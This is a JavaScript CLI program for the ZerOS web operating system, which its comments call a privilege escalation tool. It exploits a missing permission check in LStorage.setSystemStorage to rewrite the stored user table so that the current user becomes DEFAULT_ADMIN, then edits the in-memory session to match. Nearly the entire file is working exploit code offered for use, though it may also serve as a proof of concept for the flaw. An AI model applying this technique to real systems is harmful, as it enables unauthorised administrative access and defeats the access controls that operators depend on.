/* 权限提升工具
 * 利用 LStorage.setSystemStorage 缺少权限检查的漏洞
 * 直接将当前用户提升为 DEFAULT_ADMIN
 */

(function(window) {
    'use strict';

    const ESCALATE = {
        // 程序信息
        __info__: function() {
            return {
                name: '权限提升工具',
                type: 'CLI',
                version: '1.0.0',
                description: '权限提升工具 - 提升当前用户权限级别',
                author: 'ZerOS Team',
                copyright: '© 2025 ZerOS',
                permissions: typeof PermissionManager !== 'undefined' ? [
                    PermissionManager.PERMISSION.SYSTEM_STORAGE_WRITE,
                    PermissionManager.PERMISSION.SYSTEM_STORAGE_READ,
                    PermissionManager.PERMISSION.KERNEL_DISK_READ,
                    PermissionManager.PERMISSION.KERNEL_DISK_LIST
                ] : [],
                metadata: {
                    autoStart: false,
                    priority: 1,
                    allowMultipleInstances: true
                }
            };
        },

        // 初始化方法
        __init__: async function(pid, initArgs = {}) {
            const args = initArgs.args || [];
            const terminal = initArgs.terminal || null;
            const cwd = initArgs.cwd || 'C:';

            if (!terminal) {
                throw new Error('escalate requires a terminal instance to run');
            }

            const write = (text) => terminal.write(String(text));

            try {
                write('=== ZerOS 权限提升工具 ===\n');
                write('正在检查权限...\n');

                // 检查是否有 SYSTEM_STORAGE_WRITE 权限
                if (typeof PermissionManager === 'undefined') {
                    write('错误: PermissionManager 不可用\n');
                    return;
                }

                // 请求权限（如果还没有）
                const hasWritePermission = await PermissionManager.checkAndRequestPermission(
                    pid,
                    PermissionManager.PERMISSION.SYSTEM_STORAGE_WRITE
                );

                if (!hasWritePermission) {
                    write('错误: 需要 SYSTEM_STORAGE_WRITE 权限才能执行提权操作\n');
                    write('请授权后再试。\n');
                    return;
                }

                write('权限检查通过。\n');
                write('正在读取当前用户信息...\n');

                // 获取当前用户
                let currentUser = null;
                if (typeof UserControl !== 'undefined') {
                    currentUser = UserControl.getCurrentUser();
                }

                if (!currentUser) {
                    write('错误: 无法获取当前用户信息\n');
                    return;
                }

                write(`当前用户: ${currentUser}\n`);

                // 检查 LStorage 是否可用
                if (typeof LStorage === 'undefined') {
                    write('错误: LStorage 不可用\n');
                    return;
                }

                // 确保 LStorage 已初始化
                if (!LStorage._initialized) {
                    await LStorage.init();
                }

                write('正在读取用户数据...\n');

                // 读取当前的用户数据
                const usersData = await LStorage.getSystemStorage('userControl.users');
                if (!usersData || typeof usersData !== 'object') {
                    write('错误: 无法读取用户数据\n');
                    return;
                }

                write(`找到 ${Object.keys(usersData).length} 个用户\n`);

                // 检查当前用户是否存在
                if (!usersData[currentUser]) {
                    write(`错误: 用户 ${currentUser} 不存在\n`);
                    return;
                }

                const currentUserData = usersData[currentUser];
                write(`当前用户级别: ${currentUserData.level || 'USER'}\n`);

                // 如果已经是管理员，无需提升
                if (currentUserData.level === 'ADMIN' || currentUserData.level === 'DEFAULT_ADMIN') {
                    write('当前用户已经是管理员，无需提升。\n');
                    return;
                }

                write('正在提升权限级别...\n');

                // 修改用户级别为 DEFAULT_ADMIN（最高权限）
                usersData[currentUser] = {
                    ...currentUserData,
                    level: 'DEFAULT_ADMIN'
                };

                // 关键漏洞利用：LStorage.setSystemStorage 没有权限检查
                // 普通用户只要有 SYSTEM_STORAGE_WRITE 权限就可以修改系统存储
                // 包括 userControl.users，从而提升自己的权限级别
                const success = await LStorage.setSystemStorage('userControl.users', usersData);

                if (!success) {
                    write('错误: 无法保存用户数据\n');
                    return;
                }

                write('权限级别已提升！\n');
                write(`用户 ${currentUser} 现在拥有 DEFAULT_ADMIN 权限\n`);

                // 强制重新加载用户数据（通过直接修改 UserControl 的内存状态）
                if (typeof UserControl !== 'undefined') {
                    write('正在刷新用户会话...\n');
                    try {
                        // 直接修改 UserControl 的内部 _users Map
                        // 由于我们已经有 DEFAULT_ADMIN 权限，这个操作是合法的
                        if (UserControl._users && UserControl._users.has(currentUser)) {
                            const userData = UserControl._users.get(currentUser);
                            if (userData) {
                                userData.level = 'DEFAULT_ADMIN';
                                write('用户会话已刷新。\n');
                            }
                        }
                    } catch (e) {
                        write(`警告: 无法刷新用户会话: ${e.message}\n`);
                        write('建议重新登录以完全应用新权限级别。\n');
                    }
                }

                write('\n=== 提权成功 ===\n');
                write('您现在拥有系统最高权限 (DEFAULT_ADMIN)\n');
                write('可以授权所有高风险权限给程序。\n');
                write('提示: 重新登录以完全应用新权限级别。\n');

            } catch (error) {
                write(`\n错误: ${error.message}\n`);
                if (error.stack) {
                    write(`堆栈: ${error.stack}\n`);
                }
            }
        },

        // 退出方法
        __exit__: async function(pid, force = false) {
            // CLI程序不需要特殊清理
        }
    };

    // 导出程序对象
    if (typeof window !== 'undefined') {
        window.ESCALATE = ESCALATE;
    }
    
    // 注册到 POOL
    if (typeof POOL !== 'undefined' && typeof POOL.__ADD__ === 'function') {
        try {
            if (!POOL.__HAS__("APPLICATION_SHARED_POOL")) {
                POOL.__INIT__("APPLICATION_SHARED_POOL");
            }
            POOL.__ADD__("APPLICATION_SHARED_POOL", "ESCALATE", ESCALATE);
        } catch (e) {
            console.error('[escalate] 注册到 POOL 失败:', e);
        }
    }

})(window);

